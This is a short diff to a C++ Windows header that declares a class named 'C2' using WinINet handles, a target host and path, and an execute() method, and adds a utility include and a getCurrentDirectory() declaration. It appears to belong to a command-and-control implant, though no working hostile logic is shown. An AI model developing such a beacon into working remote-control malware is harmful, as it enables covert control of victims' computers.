@@ -5,7 +5,7 @@ using namespace std;
 #include <string>
 #include <windows.h>
 #include <wininet.h>
-
+#include "UTIL.h"
 
 class C2 {
 	string response;
@@ -17,10 +17,13 @@ class C2 {
 	HINTERNET connectHandle = NULL;
 	HINTERNET requestHandle = NULL;
 
+	UTIL util;
+
 public:
 	DWORD error = NULL;
 	C2() {};
 	C2(LPCSTR hostName, LPCSTR pathName) :hostName(hostName), pathName(pathName) {};
+	void getCurrentDirectory();
 	void setHostName(LPCSTR hostName);
 	void setPathName(LPCSTR pathName);
 	void execute();
